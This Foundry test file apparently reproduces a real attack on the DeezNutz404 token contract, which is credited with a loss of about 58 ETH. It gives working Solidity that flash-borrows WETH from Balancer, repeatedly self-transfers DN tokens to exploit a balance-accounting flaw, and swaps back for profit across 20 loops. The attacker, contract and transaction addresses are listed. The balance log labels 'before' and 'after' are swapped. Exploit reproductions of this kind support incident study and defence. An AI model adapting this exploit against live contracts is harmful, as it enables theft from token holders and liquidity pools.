// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

// @KeyInfo - Total Lost : ~58 $ETH
// Attacker : https://etherscan.io/address/0xd215ffaf0f85fb6f93f11e49bd6175ad58af0dfd
// Attack Contract : hhttps://etherscan.io/address/0xd129d8c12f0e7aa51157d9e6cc3f7ece2dc84ecd
// Vulnerable Contract : https://etherscan.io/address/0xb57e874082417b66877429481473cf9fcd8e0b8a
// Attack Tx : https://etherscan.io/tx/0xbeefd8faba2aa82704afe821fd41b670319203dd9090f7af8affdf6bcfec2d61

// @Analysis
// https://twitter.com/CertiKAlert/status/1760583150382579879

library SafeMath {
    function add(uint256 x, uint256 y) internal pure returns (uint256 z) {
        require((z = x + y) >= x, "ds-math-add-overflow");
    }

    function sub(uint256 x, uint256 y) internal pure returns (uint256 z) {
        require((z = x - y) <= x, "ds-math-sub-underflow");
    }

    function mul(uint256 x, uint256 y) internal pure returns (uint256 z) {
        require(y == 0 || (z = x * y) / y == x, "ds-math-mul-overflow");
    }
}

interface IDeezNutz404UNIV2POOL {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);
    function sync() external;
}

interface IBalancer {
    function flashLoan(
        IFlashLoanRecipient recipient,
        IERC20[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IDN is IERC20 {}

contract ContractTest is Test {
    using SafeMath for uint256;

    IBalancer Balancer = IBalancer(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IDeezNutz404UNIV2POOL pool = IDeezNutz404UNIV2POOL(0x1fB4904b26DE8C043959201A63b4b23C414251E2);
    IDN DN = IDN(0xb57E874082417b66877429481473CF9FCd8e0b8a);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        // evm_version Requires to be "shanghai"
        cheats.createSelectFork("mainnet", 19_277_803 - 1);
        cheats.label(address(DN), "DeezNutz404");
        cheats.label(address(WETH), "WETH");
        cheats.label(address(pool), "pool");
        cheats.label(address(Balancer), "Balancer");
        deal(address(WETH), address(this), 1);
    }

    function testExploit() public {
        emit log_named_uint("Attacker Eth balance after attack:", WETH.balanceOf(address(this)));
        uint256 DNbalancePool = DN.balanceOf(address(pool));
        uint256 flashpoolDN = DNbalancePool * 976 / 1000;
        for (uint256 i = 0; i < 20; i++) {
            (uint112 reserveDN, uint112 reserveWETH,) = pool.getReserves();
            uint256 amountInWETH = getAmountIn(flashpoolDN, reserveWETH, reserveDN);

            IERC20[] memory tokens = new IERC20[](1);
            tokens[0] = WETH;
            uint256[] memory amounts = new uint256[](1);
            amounts[0] = amountInWETH;
            Balancer.flashLoan(IFlashLoanRecipient(address(this)), tokens, amounts, abi.encode(0));

            DNToWETH(DN.balanceOf(address(this)), false);
        }
        emit log_named_uint("Attacker Eth balance before attack:", WETH.balanceOf(address(this)));
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        WETHToDN(amounts[0]); // WETHToPool
        uint256 DNnumber = 57_817_961_129_856_826_039_583_437;
        for (uint256 i = 0; i < 8; i++) {
            DN.transfer(address(this), DNnumber);
        }

        (uint112 reserveDN, uint112 reserveWETH,) = pool.getReserves();
        uint256 amountInDN = getAmountIn(amounts[0], reserveDN, reserveWETH);

        DNToWETH(amountInDN, true);
        WETH.transfer(address(Balancer), amounts[0]);
    }

    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) internal pure returns (uint256 amountOut) {
        require(amountIn > 0, "UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT");
        require(reserveIn > 0 && reserveOut > 0, "UniswapV2Library: INSUFFICIENT_LIQUIDITY");
        uint256 amountInWithFee = amountIn.mul(997);
        uint256 numerator = amountInWithFee.mul(reserveOut);
        uint256 denominator = reserveIn.mul(1000).add(amountInWithFee);
        amountOut = numerator / denominator;
    }

    // given an output amount of an asset and pair reserves, returns a required input amount of the other asset
    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) internal pure returns (uint256 amountIn) {
        require(amountOut > 0, "UniswapV2Library: INSUFFICIENT_OUTPUT_AMOUNT");
        require(reserveIn > 0 && reserveOut > 0, "UniswapV2Library: INSUFFICIENT_LIQUIDITY");
        uint256 numerator = reserveIn.mul(amountOut).mul(1000);
        uint256 denominator = reserveOut.sub(amountOut).mul(997);
        amountIn = (numerator / denominator).add(1);
    }

    function WETHToDN(uint256 amount) internal {
        (uint112 reserveDN, uint112 reserveWETH,) = pool.getReserves();
        uint256 amountOut;
        amountOut = amount * 997 * reserveDN / (reserveWETH * 1000 + amount * 997);
        WETH.transfer(address(pool), amount);
        pool.swap(amountOut, 0, address(this), "");
    }

    function DNToWETH(uint256 amount, bool slippage) internal {
        (uint112 reserveDN, uint112 reserveWETH,) = pool.getReserves();
        uint256 amountOut;
        amountOut = amount * 997 * reserveWETH / (reserveDN * 1000 + amount * 997);
        if (slippage) {
            DN.transfer(address(pool), amount + amount * 3 / 100);
            pool.swap(0, amountOut, address(this), "");
        } else {
            DN.transfer(address(pool), amount);
            pool.swap(0, amountOut - amountOut * 3 / 100, address(this), "");
        }
    }

    fallback() external payable {}
}
